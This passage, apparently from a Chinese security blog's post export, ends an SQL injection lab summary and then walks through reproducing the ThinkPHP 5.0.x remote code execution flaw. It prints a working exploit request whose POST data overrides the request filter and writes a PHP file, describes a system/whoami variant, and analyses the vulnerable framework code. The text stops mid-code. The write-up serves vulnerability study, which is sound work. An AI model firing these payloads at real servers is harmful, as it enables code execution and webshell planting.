有反应了，闭合成功\n剩下和前面一样\n小结：测试流程\n先数字，再字符，都是看页面报错\n有错误，来注释，依然报错尝试添加其他符号闭合,直到页面正常\n闭合成功看页面，有回显，union，无回显，布尔盲注\n无错误，测试时间盲注payload，再按照前面闭合流程走一遍\n找到闭合方式，以及注入方式，后面才讲bypass\n盲注框架：https://github.com/JacquelinXiang/sqli_blind\n","slug":"sql-labs-less1-10","date":"2022-10-28T11:34:39.000Z","categories_index":"靶场","tags_index":"sql注入","author_index":"Longw"},{"id":"02bb8134dce40015108a5a765c734167","title":"5.0-5.0.23RCE漏洞复现","content":"\n\n参考文章：https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ\nhttps://y4tacker.blog.csdn.net/article/details/115893304\nhttps://mp.weixin.qq.com/s/qI10_Wtc1wrcNvAP_MBURQ\n复现：环境：tp5.0.6  php5.4.45  \n先直接用Y4tacher的payload刚一波\nURL地址\nurl&#x2F;public&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode\nPOST数据\npath&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3k0dGFja2VyLnBocCcsJzw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET\n\n传过去页面报错，还以为失败了，看目录才发现已经将文件写入进去了\n\n\n接下来就是看文章读代码了\n漏洞利用点在thinkphp\\library\\think\\Request.php里的method方法\n&#x2F;**\n     * 当前的请求类型\n     * @access public\n     * @param bool $method  true 获取原始请求类型\n     * @return string\n     *&#x2F;\n    public function method($method &#x3D; false)\n    &#123;\n        if (true &#x3D;&#x3D;&#x3D; $method) &#123;\n            &#x2F;&#x2F; 获取原始请求类型\n            return IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);\n        &#125; elseif (!$this-&gt;method) &#123;\n            if (isset($_POST[Config::get(&#39;var_method&#39;)])) &#123;\n                $this-&gt;method &#x3D; strtoupper($_POST[Config::get(&#39;var_method&#39;)]);\n                $this-&gt;&#123;$this-&gt;method&#125;($_POST);\n            &#125; elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) &#123;\n                $this-&gt;method &#x3D; strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);\n            &#125; else &#123;\n                $this-&gt;method &#x3D; IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);\n            &#125;\n        &#125;\n        return $this-&gt;method;\n    &#125;\n\n$method默认为false，会用get方法获取$_POST里的‘var_method’，在config.php里设置为_method参数的值，get函数就是获取内容，没什么营养。然后变成大写，接着就是动态调用类的方法，就是获取到底_method的值作为函数调用，$_POST的值作为参数。所以传入_method=xxx ，就会调用xxx函数，当这个xxx是__construct函数时\n&#x2F;**\n    * 架构函数\n    * @access protected\n    * @param array $options 参数\n    *&#x2F;\n   protected function __construct($options &#x3D; [])\n   &#123;\n       foreach ($options as $name &#x3D;&gt; $item) &#123;\n           if (property_exists($this, $name)) &#123;\n               $this-&gt;$name &#x3D; $item;\n           &#125;\n       &#125;\n       if (is_null($this-&gt;filter)) &#123;\n           $this-&gt;filter &#x3D; Config::get(&#39;default_filter&#39;);\n       &#125;\n       &#x2F;&#x2F; 保存 php:&#x2F;&#x2F;input\n       $this-&gt;input &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);\n   &#125;\n\n先检查这个类里是否有传入的参数相匹配的属性，有就赋值给属性，这就表示可以覆盖里面的所有属性值。之后，检查属性filter的值是否为空，为空则设置为全局默认过滤方法。之后通过input伪协议获取$_POST的内容存放到input属性里面。\n这里能覆盖属性，接着就是要找回调函数，和上个漏洞一样这里也是通过覆盖filter的值，在通过回调函数调用filter过滤时，执行代码。\n这个时候应该是在整个类里找使用filter的地方\n&#x2F;**\n    * 设置或获取当前的过滤规则\n    * @param mixed $filter 过滤规则\n    * @return mixed\n    *&#x2F;\n   public function filter($filter &#x3D; null)\n   &#123;\n       if (is_null($filter)) &#123;\n           return $this-&gt;filter;\n       &#125; else &#123;\n           $this-&gt;filter &#x3D; $filter;\n       &#125;\n   &#125;\n\nfilter过滤函数是取得类属性filter\n接着是input函数\n&#x2F;**\n     * 获取变量 支持过滤和默认值\n     * @param array         $data 数据源\n     * @param string|false  $name 字段名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤函数\n     * @return mixed\n     *&#x2F;\n    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (false &#x3D;&#x3D;&#x3D; $name) &#123;\n            &#x2F;&#x2F; 获取原始数据\n            return $data;\n        &#125;\n        $name &#x3D; (string) $name;\n        if (&#39;&#39; !&#x3D; $name) &#123;\n            &#x2F;&#x2F; 解析name\n            if (strpos($name, &#39;&#x2F;&#39;)) &#123;\n                list($name, $type) &#x3D; explode(&#39;&#x2F;&#39;, $name);\n            &#125; else &#123;\n                $type &#x3D; &#39;s&#39;;\n            &#125;\n            &#x2F;&#x2F; 按.拆分成多维数组进行判断\n            foreach (explode(&#39;.&#39;, $name) as $val) &#123;\n                if (isset($data[$val])) &#123;\n                    $data &#x3D; $data[$val];\n                &#125; else &#123;\n                    &#x2F;&#x2F; 无输入数据，返回默认值\n                    return $default;\n                &#125;\n            &#125;\n            if (is_object($data)) &#123;\n                return $data;\n            &#125;\n        &#125;\n\n        &#x2F;&#x2F; 解析过滤器\n        if (is_null($filter)) &#123;\n            $filter &#x3D; [];\n        &#125; else &#123;\n            $filter &#x3D; $filter ?: $this-&gt;filter;\n            if (is_string($filter)) &#123;\n                $filter &#x3D; explode(&#39;,&#39;, $filter);\n            &#125; else &#123;\n                $filter &#x3D; (array) $filter;\n            &#125;\n        &#125;\n\n        $filter[] &#x3D; $default;\n        if (is_array($data)) &#123;\n            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);\n            reset($data);\n        &#125; else &#123;\n            $this-&gt;filterValue($data, $name, $filter);\n        &#125;\n\n        if (isset($type) &amp;&amp; $data !&#x3D;&#x3D; $default) &#123;\n            &#x2F;&#x2F; 强制类型转换\n            $this-&gt;typeCast($data, $type);\n        &#125;\n        return $data;\n    &#125;\n\n如果传入的$name恒等于false，就直接返回$data。不是false则将$name的类型转化为string。判断$name是否为空字符串，不是则解析$name，通过/来分开$name。\n之后又通过. 来拆开$name，判断$data里面是否有拆开的$name的值。接着判断$data是不是对象，是就返回$data。\n判断$filter是否为空，不为空就通过\n$filter = $filter ?: $this-&gt;filter;\n这句有点懵逼，反正就是获取类的filter属性。是string就分开，不是string就变为数组\n这怎么后面又  $filter[] = $default; \n还是写个小代码看看，是怎么回事\n&lt;?php\nfunction test($filter,$default&#x3D;null)&#123;\n    if (is_null($filter)) &#123;\n        $filter &#x3D; [];\n    &#125; else &#123;\n        if (is_string($filter)) &#123;\n            $filter &#x3D; explode(&#39;,&#39;, $filter);\n        &#125; else &#123;\n            $filter &#x3D; (array) $filter;\n        &#125;\n    &#125;\n\n    $filter[] &#x3D; $default;\n    var_dump($filter);\n&#125;\ntest(&#39;assert&#39;);\n?&gt;\narray(2) &#123; [0]&#x3D;&gt; string(6) &quot;assert&quot; [1]&#x3D;&gt; NULL &#125;\n\n你妹的，原来就是添加到数组的意思\n后面判断$data是否为数组，是的话就通过array_walk_recursive进行过滤，终于到这一步了，通过filterValue进行过滤，$filter作为filterValue的参数。不是数组也通过filterValue过滤。之后就是强转data的类型，返回数据了。\n&#x2F;**\n     * 递归过滤给定的值\n     * @param mixed     $value 键值\n     * @param mixed     $key 键名\n     * @param array     $filters 过滤方法+默认值\n     * @return mixed\n     *&#x2F;\n    private function filterValue(&amp;$value, $key, $filters)\n    &#123;\n        $default &#x3D; array_pop($filters);\n        foreach ($filters as $filter) &#123;\n            if (is_callable($filter)) &#123;\n                &#x2F;&#x2F; 调用函数或者方法过滤\n                $value &#x3D; call_user_func($filter, $value);\n            &#125; elseif (is_scalar($value)) &#123;\n                if (strpos($filter, &#39;&#x2F;&#39;)) &#123;\n                    &#x2F;&#x2F; 正则过滤\n                    if (!preg_match($filter, $value)) &#123;\n                        &#x2F;&#x2F; 匹配不成功返回默认值\n                        $value &#x3D; $default;\n                        break;\n                    &#125;\n                &#125; elseif (!empty($filter)) &#123;\n                    &#x2F;&#x2F; filter函数不存在时, 则使用filter_var进行过滤\n                    &#x2F;&#x2F; filter为非整形值时, 调用filter_id取得过滤id\n                    $value &#x3D; filter_var($value, is_int($filter) ? $filter : filter_id($filter));\n                    if (false &#x3D;&#x3D;&#x3D; $value) &#123;\n                        $value &#x3D; $default;\n                        break;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        return $this-&gt;filterExp($value);\n    &#125;\n\nfilterValue通过call_user_func进行过滤。参数都可以同method方法来控制。\n现在找用到input函数的地方，哪里用到了\n第一个地方就是param函数了\n&#x2F;**\n     * 获取获取当前请求的参数\n     * @access public\n     * @param string|array  $name 变量名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤方法\n     * @return mixed\n     *&#x2F;\n    public function param($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (empty($this-&gt;param)) &#123;\n            $method &#x3D; $this-&gt;method(true);\n            &#x2F;&#x2F; 自动获取请求变量\n            switch ($method) &#123;\n                case &#39;POST&#39;:\n                    $vars &#x3D; $this-&gt;post(false);\n                    break;\n                case &#39;PUT&#39;:\n                case &#39;DELETE&#39;:\n                case &#39;PATCH&#39;:\n                    $vars &#x3D; $this-&gt;put(false);\n                    break;\n                default:\n                    $vars &#x3D; [];\n            &#125;\n            &#x2F;&#x2F; 当前请求参数和URL地址中的参数合并\n            $this-&gt;param &#x3D; array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\n        &#125;\n        if (true &#x3D;&#x3D;&#x3D; $name) &#123;\n            &#x2F;&#x2F; 获取包含文件上传信息的数组\n            $file &#x3D; $this-&gt;file();\n            $data &#x3D; array_merge($this-&gt;param, $file);\n            return $this-&gt;input($data, &#39;&#39;, $default, $filter);\n        &#125;\n        return $this-&gt;input($this-&gt;param, $name, $default, $filter);\n    &#125;\n\n\n判断param属性是否为空，接着调用mthod方法。然后就是获取请求内容，接着调用input方法了。\n开始以为调用的是最下面的input，后面看文章发现，在第一个if判断时，会调用\n // 当前请求参数和URL地址中的参数合并\n​            $this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\nget函数:\n&#x2F;**\n     * 设置获取获取GET参数\n     * @access public\n     * @param string|array  $name 变量名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤方法\n     * @return mixed\n     *&#x2F;\n    public function get($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (empty($this-&gt;get)) &#123;\n            $this-&gt;get &#x3D; $_GET;\n        &#125;\n        if (is_array($name)) &#123;\n            $this-&gt;param      &#x3D; [];\n            return $this-&gt;get &#x3D; array_merge($this-&gt;get, $name);\n        &#125;\n        return $this-&gt;input($this-&gt;get, $name, $default, $filter);\n    &#125;\n\n而在get函数里面，也会用到input函数。但是在这个get传入了false，在执行到input的时候，会直接返回数据。不会进行下面语句。\npublicfunctioninput($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n  &#123;\n      if (false &#x3D;&#x3D;&#x3D; $name) &#123;\n          &#x2F;&#x2F; 获取原始数据\n          return$data;\n      &#125;\n\n而在后面一个input，传入的name为默认的空字符串，会执行到下面过滤，就会触发命令执行。而且这个$name不是类的属性，只是局部变量，不能通过传入$name进行覆盖。\n所以，第一个参考链接里，启明星辰那篇文章应该写错了，为了防止判断错误，直接脚本验证\n当然没有动态调式过，可能分析有错\n&lt;?php\nfunction get($name&#x3D;&#39;&#39;,$default &#x3D; null, $filter &#x3D; &#39;&#39;)&#123;\n    $default&#x3D; &#39;&#39;;\n    $filter&#x3D;&#39;&#39;;\n    return test1($name,1);\n&#125;\nfunction test1($name&#x3D;&#39;&#39;,$data)&#123;\n    if(false&#x3D;&#x3D;&#x3D;$name)&#123;\n        return $data;\n    &#125;\n    return $data+1;\n&#125;\necho get(false).&#39;&lt;&#x2F;br&gt;&#39;;\necho get();\n?&gt;\n\n\n上面就是通过method来代码执行的链\n所以需要先用method函数修改属性值，接着利用param函数来执行代码，到这里就懵逼了，直接看文章怎么用的\n第一个payload：简单\n\n直接post提交参数就行了，关键是原理是啥呢？\n看入口文件怎么写的，包含start.php，在使用App的run函数\n&#x2F;**\n     * 执行应用程序\n     * @access public\n     * @param Request $request Request对象\n     * @return Response\n     * @throws Exception\n     *&#x2F;\n    public static function run(Request $request &#x3D; null)\n    &#123;\n        is_null($request) &amp;&amp; $request &#x3D; Request::instance();\n\n        try &#123;\n            $config &#x3D; self::initCommon();\n            if (defined(&#39;BIND_MODULE&#39;)) &#123;\n                &#x2F;&#x2F; 模块&#x2F;控制器绑定\n                BIND_MODULE &amp;&amp; Route::bind(BIND_MODULE);\n            &#125; elseif ($config[&#39;auto_bind_module&#39;]) &#123;\n                &#x2F;&#x2F; 入口自动绑定\n                $name &#x3D; pathinfo($request-&gt;baseFile(), PATHINFO_FILENAME);\n                if ($name &amp;&amp; &#39;index&#39; !&#x3D; $name &amp;&amp; is_dir(APP_PATH . $name)) &#123;\n                    Route::bind($name);\n                &#125;\n            &#125;\n\n            $request-&gt;filter($config[&#39;default_filter&#39;]);\n\n            if ($config[&#39;lang_switch_on&#39;]) &#123;\n                &#x2F;&#x2F; 开启多语言机制 检测当前语言\n                Lang::detect();\n            &#125; else &#123;\n                &#x2F;&#x2F; 读取默认语言\n                Lang::range($config[&#39;default_lang&#39;]);\n            &#125;\n            $request-&gt;langset(Lang::range());\n            &#x2F;&#x2F; 加载系统语言包\n            Lang::load([\n                THINK_PATH . &#39;lang&#39; . DS . $request-&gt;langset() . EXT,\n                APP_PATH . &#39;lang&#39; . DS . $request-&gt;langset() . EXT,\n            ]);\n\n            &#x2F;&#x2F; 获取应用调度信息\n            $dispatch &#x3D; self::$dispatch;\n            if (empty($dispatch)) &#123;\n                &#x2F;&#x2F; 进行URL路由检测\n                $dispatch &#x3D; self::routeCheck($request, $config);\n            &#125;\n            &#x2F;&#x2F; 记录当前调度信息\n            $request-&gt;dispatch($dispatch);\n\n            &#x2F;&#x2F; 记录路由和请求信息\n            if (self::$debug) &#123;\n                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);\n                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);\n                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);\n            &#125;\n\n            &#x2F;&#x2F; 监听app_begin\n            Hook::listen(&#39;app_begin&#39;, $dispatch);\n            &#x2F;&#x2F; 请求缓存检查\n            $request-&gt;cache($config[&#39;request_cache&#39;], $config[&#39;request_cache_expire&#39;], $config[&#39;request_cache_except&#39;]);\n\n            switch ($dispatch[&#39;type&#39;]) &#123;\n                case &#39;redirect&#39;:\n                    &#x2F;&#x2F; 执行重定向跳转\n                    $data &#x3D; Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)-&gt;code($dispatch[&#39;status&#39;]);\n                    break;\n                case &#39;module&#39;:\n                    &#x2F;&#x2F; 模块&#x2F;控制器&#x2F;操作\n                    $data &#x3D; self::module($dispatch[&#39;module&#39;], $config, isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);\n                    break;\n                case &#39;controller&#39;:\n                    &#x2F;&#x2F; 执行控制器操作\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; Loader::action($dispatch[&#39;controller&#39;], $vars, $config[&#39;url_controller_layer&#39;], $config[&#39;controller_suffix&#39;]);\n                    break;\n                case &#39;method&#39;:\n                    &#x2F;&#x2F; 执行回调方法\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; self::invokeMethod($dispatch[&#39;method&#39;], $vars);\n                    break;\n                case &#39;function&#39;:\n                    &#x2F;&#x2F; 执行闭包\n                    $data &#x3D; self::invokeFunction($dispatch[&#39;function&#39;]);\n                    break;\n                case &#39;response&#39;:\n                    $data &#x3D; $dispatch[&#39;response&#39;];\n                    break;\n                default:\n                    throw new \\InvalidArgumentException(&#39;dispatch type not support&#39;);\n            &#125;\n        &#125; catch (HttpResponseException $exception) &#123;\n            $data &#x3D; $exception-&gt;getResponse();\n        &#125;\n\n        &#x2F;&#x2F; 清空类的实例化\n        Loader::clearInstance();\n\n        &#x2F;&#x2F; 输出数据到客户端\n        if ($data instanceof Response) &#123;\n            $response &#x3D; $data;\n        &#125; elseif (!is_null($data)) &#123;\n            &#x2F;&#x2F; 默认自动识别响应输出类型\n            $isAjax   &#x3D; $request-&gt;isAjax();\n            $type     &#x3D; $isAjax ? Config::get(&#39;default_ajax_return&#39;) : Config::get(&#39;default_return_type&#39;);\n            $response &#x3D; Response::create($data, $type);\n        &#125; else &#123;\n            $response &#x3D; Response::create();\n        &#125;\n\n        &#x2F;&#x2F; 监听app_end\n        Hook::listen(&#39;app_end&#39;, $response);\n\n        return $response;\n    &#125;\n\n很长，前面就是处理，到判断$dispatch才是重点\n&#x2F;&#x2F; 获取应用调度信息\n           $dispatch &#x3D; self::$dispatch;\n           if (empty($dispatch)) &#123;\n               &#x2F;&#x2F; 进行URL路由检测\n               $dispatch &#x3D; self::routeCheck($request, $config);\n           &#125;\n           &#x2F;&#x2F; 记录当前调度信息\n           $request-&gt;dispatch($dispatch);\n\n使用routeCheck检查\n&#x2F;**\n     * URL路由检测（根据PATH_INFO)\n     * @access public\n     * @param  \\think\\Request $request\n     * @param  array          $config\n     * @return array\n     * @throws \\think\\Exception\n     *&#x2F;\n    public static function routeCheck($request, array $config)\n    &#123;\n        $path   &#x3D; $request-&gt;path();\n        $depr   &#x3D; $config[&#39;pathinfo_depr&#39;];\n        $result &#x3D; false;\n        &#x2F;&#x2F; 路由检测\n        $check &#x3D; !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];\n        if ($check) &#123;\n            &#x2F;&#x2F; 开启路由\n            if (is_file(RUNTIME_PATH . &#39;route.php&#39;)) &#123;\n                &#x2F;&#x2F; 读取路由缓存\n                $rules &#x3D; include RUNTIME_PATH . &#39;route.php&#39;;\n                if (is_array($rules)) &#123;\n                    Route::rules($rules);\n                &#125;\n            &#125; else &#123;\n                $files &#x3D; $config[&#39;route_config_file&#39;];\n                foreach ($files as $file) &#123;\n                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;\n                        &#x2F;&#x2F; 导入路由配置\n                        $rules &#x3D; include CONF_PATH . $file . CONF_EXT;\n                        if (is_array($rules)) &#123;\n                            Route::import($rules);\n                        &#125;\n                    &#125;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 路由检测（根据路由定义返回不同的URL调度）\n            $result &#x3D; Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);\n            $must   &#x3D; !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];\n            if ($must &amp;&amp; false &#x3D;&#x3D;&#x3D; $result) &#123;\n                &#x2F;&#x2F; 路由无效\n                throw new RouteNotFoundException();\n            &#125;\n        &#125;\n        if (false &#x3D;&#x3D;&#x3D; $result) &#123;\n            &#x2F;&#x2F; 路由无效 解析模块&#x2F;控制器&#x2F;操作&#x2F;参数... 支持控制器自动搜索\n            $result &#x3D; Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);\n        &#125;\n        return $result;\n    &#125;\n\n\n一堆处理，直到使用check函数\n&#x2F;**\n     * 检测URL路由\n     * @access public\n     * @param Request   $request Request请求对象\n     * @param string    $url URL地址\n     * @param string    $depr URL分隔符\n     * @param bool      $checkDomain 是否检测域名规则\n     * @return false|array\n     *&#x2F;\n    public static function check($request, $url, $depr &#x3D; &#39;&#x2F;&#39;, $checkDomain &#x3D; false)\n    &#123;\n        &#x2F;&#x2F; 分隔符替换 确保路由定义使用统一的分隔符\n        $url &#x3D; str_replace($depr, &#39;|&#39;, $url);\n\n        if (strpos($url, &#39;|&#39;) &amp;&amp; isset(self::$rules[&#39;alias&#39;][strstr($url, &#39;|&#39;, true)])) &#123;\n            &#x2F;&#x2F; 检测路由别名\n            $result &#x3D; self::checkRouteAlias($request, $url, $depr);\n            if (false !&#x3D;&#x3D; $result) &#123;\n                return $result;\n            &#125;\n        &#125;\n        $method &#x3D; strtolower($request-&gt;method());\n        &#x2F;&#x2F; 获取当前请求类型的路由规则\n        $rules &#x3D; self::$rules[$method];\n        &#x2F;&#x2F; 检测域名部署\n        if ($checkDomain) &#123;\n            self::checkDomain($request, $rules, $method);\n        &#125;\n        &#x2F;&#x2F; 检测URL绑定\n        $return &#x3D; self::checkUrlBind($url, $rules, $depr);\n        if (false !&#x3D;&#x3D; $return) &#123;\n            return $return;\n        &#125;\n        if (&#39;|&#39; !&#x3D; $url) &#123;\n            $url &#x3D; rtrim($url, &#39;|&#39;);\n        &#125;\n        $item &#x3D; str_replace(&#39;|&#39;, &#39;&#x2F;&#39;, $url);\n        if (isset($rules[$item])) &#123;\n            &#x2F;&#x2F; 静态路由规则检测\n            $rule &#x3D; $rules[$item];\n            if (true &#x3D;&#x3D;&#x3D; $rule) &#123;\n                $rule &#x3D; self::getRouteExpress($item);\n            &#125;\n            if (!empty($rule[&#39;route&#39;]) &amp;&amp; self::checkOption($rule[&#39;option&#39;], $request)) &#123;\n                self::setOption($rule[&#39;option&#39;]);\n                return self::parseRule($item, $rule[&#39;route&#39;], $url, $rule[&#39;option&#39;]);\n            &#125;\n        &#125;\n\n        &#x2F;&#x2F; 路由规则检测\n        if (!empty($rules)) &#123;\n            return self::checkRoute($request, $rules, $url, $depr);\n        &#125;\n        return false;\n    &#125;\n\n    private static function getRouteExpress($key)\n    &#123;\n        return self::$domainRule ? self::$domainRule[&#39;*&#39;][$key] : self::$rules[&#39;*&#39;][$key];\n    &#125;\n\n\n第一个if不用看，下面直接调用最开始实例化的request对象的method方法\n这个request对象是在run方法开始的时候实例化的\nmethod为false，直接通过\n$this-&gt;method = strtoupper($_POST[Config::get(‘var_method’)]);\n​                $this-&gt;{$this-&gt;method}($_POST);\n获取_method的值，动态调用，所以传入的_method=__construct\n赋值给$method和$filter\n直到回到run函数，继续往下走，就会执行到param函数\n&#x2F;&#x2F; 获取应用调度信息\n            $dispatch &#x3D; self::$dispatch;\n            if (empty($dispatch)) &#123;\n                &#x2F;&#x2F; 进行URL路由检测\n                $dispatch &#x3D; self::routeCheck($request, $config);\n            &#125;\n            &#x2F;&#x2F; 记录当前调度信息\n            $request-&gt;dispatch($dispatch);\n\n            &#x2F;&#x2F; 记录路由和请求信息\n            if (self::$debug) &#123;\n                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);\n                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);\n                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);\n            &#125;\n\n走到下面这个if判断的时候，获取$debug属性值，默认ture。所以就会走到\nLog::record(‘[ PARAM ] ‘.var_export($request-&gt;param(), true), ‘info’);\n这个时候就完成了命令执行的第二步，获取POST的数据whoami放到$var里面，最后是$data里，前面设置了$filter为system，最后通过call_user_func来执行命令。\n如果没有开启debug模式，就不会到达第二步触发命令执行。所以，这个洞才强调需要开启debug模式才行。\n第二个payload：URL地址\nurl&#x2F;public&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode\nPOST数据\npath&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3k0dGFja2VyLnBocCcsJzw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET\n\n这个也是y4tacker文章中使用的payload，用到一个特性，在特定条件下，可以通过::调用非静态方法\n这个payload触发param的地方，在于将$dispatch[‘type’]的值设置为method，通过switch，调用param函数。具体理解看下面了：\n看一下这个payload，先是路由?s=captcha&amp;g=implode，接着POST传入了一段base64编码的php语句，_mehtod属性为__construct方法，传入的$filter[]有多个，和method为GET\n不了解路由有什么用，看下文章。文中说传入captcha是为了获取路由\n很尴尬，我这个5.0.6版本的tp没有captcha。我尝试去掉captcha，只留下implode发现也能写入成功，同时页面也就没有了captcha模块不存在的错误。\n这个implode就是使用implode模块的意思，前面的g可以换成任意字母\n同时页面报错implode最多需要两个参数，传入了五个，这是不是表示implode是函数的意思。基础不牢地动天摇，你妹的，这是php内置函数，作用是字符串连接数组的\n先进入run方法，之后if判断$dispatch为空则进入routeCheck方法\n&#x2F;**\n     * URL路由检测（根据PATH_INFO)\n     * @access public\n     * @param  \\think\\Request $request\n     * @param  array          $config\n     * @return array\n     * @throws \\think\\Exception\n     *&#x2F;\n    public static function routeCheck($request, array $config)\n    &#123;\n        $path   &#x3D; $request-&gt;path();\n        $depr   &#x3D; $config[&#39;pathinfo_depr&#39;];\n        $result &#x3D; false;\n        &#x2F;&#x2F; 路由检测\n        $check &#x3D; !is_null(self::$routeCheck) ? self::$routeCheck : $config[&#39;url_route_on&#39;];\n        if ($check) &#123;\n            &#x2F;&#x2F; 开启路由\n            if (is_file(RUNTIME_PATH . &#39;route.php&#39;)) &#123;\n                &#x2F;&#x2F; 读取路由缓存\n                $rules &#x3D; include RUNTIME_PATH . &#39;route.php&#39;;\n                if (is_array($rules)) &#123;\n                    Route::rules($rules);\n                &#125;\n            &#125; else &#123;\n                $files &#x3D; $config[&#39;route_config_file&#39;];\n                foreach ($files as $file) &#123;\n                    if (is_file(CONF_PATH . $file . CONF_EXT)) &#123;\n                        &#x2F;&#x2F; 导入路由配置\n                        $rules &#x3D; include CONF_PATH . $file . CONF_EXT;\n                        if (is_array($rules)) &#123;\n                            Route::import($rules);\n                        &#125;\n                    &#125;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 路由检测（根据路由定义返回不同的URL调度）\n            $result &#x3D; Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);\n            $must   &#x3D; !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;];\n            if ($must &amp;&amp; false &#x3D;&#x3D;&#x3D; $result) &#123;\n                &#x2F;&#x2F; 路由无效\n                throw new RouteNotFoundException();\n            &#125;\n        &#125;\n        if (false &#x3D;&#x3D;&#x3D; $result) &#123;\n            &#x2F;&#x2F; 路由无效 解析模块&#x2F;控制器&#x2F;操作&#x2F;参数... 支持控制器自动搜索\n            $result &#x3D; Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]);\n        &#125;\n        return $result;\n    &#125;\n\n之后一样进入check方法，进行属性覆盖，最后进入param方法\n这个implode是通过param方法中的get方法\n $this-&gt;param &#x3D; array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\nif (empty($this-&gt;get)) &#123;\n            $this-&gt;get &#x3D; $_GET;\n        &#125;\n\n这样这个get属性就变成了implode，之后进入input方法\n返回get的值，再将这个值和$vars合并在一起\nswitch ($method) &#123;\n               case&#39;POST&#39;:\n                   $vars &#x3D; $this-&gt;post(false);\n                   break;\n               case&#39;PUT&#39;:\n               case&#39;DELETE&#39;:\n               case&#39;PATCH&#39;:\n                   $vars &#x3D; $this-&gt;put(false);\n                   break;\n               default:\n                   $vars &#x3D; [];\n           &#125;\n\n但是，这次的method的值为GET，所以只有一个get值，最后进入param方法最下面的input方法\nif (is_array($data)) &#123;\n            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);\n            reset($data);\n        &#125; else &#123;\n            $this-&gt;filterValue($data, $name, $filter);\n        &#125;\n\n通过array_walk_recursive进行过滤，又进入filterValue方法\nforeach ($filters as $filter) &#123;\n            if (is_callable($filter)) &#123;\n                &#x2F;&#x2F; 调用函数或者方法过滤\n                $value &#x3D; call_user_func($filter, $value);\n\n遍历filter数组分别进行过滤$value的值，这时的$value为impolde，filter[]为set_error_handler，self::path，base64_decode，\\think\\view\\driver\\Php::Display\nset_error_handler方法，看y4tacker的描述：\n这里面还有一个比较巧妙的地方是set_error_handler的使用， tp5 默认就调用了 error_reporting(E_ALL) ，且有一套内置的错误处理机制。上面预期解也提到了即使报了 warning 程序也会中止执行。set_error_handler() 函数设置用户自定义的错误处理程序，会绕过标准 PHP 错误处理程序。其他的还有set_exception_handler() 函数设置用户自定义的异常处理函数。register_shutdown_function() 函数会注册一个会在PHP中止时执行的函数\n之后就是self::path函数，返回path属性，也就base64编码的值，之后通过base64_decode进行解码，再通过Php::Display的eval执行代码，写入shell文件\n综上，需要implode是为了防止报错导致停止执行\n传入captche是为了让其他版本的tp的checkRoute返回路由，之后通过返回type为method\nswitch ($dispatch[&#39;type&#39;]) &#123;\n                case 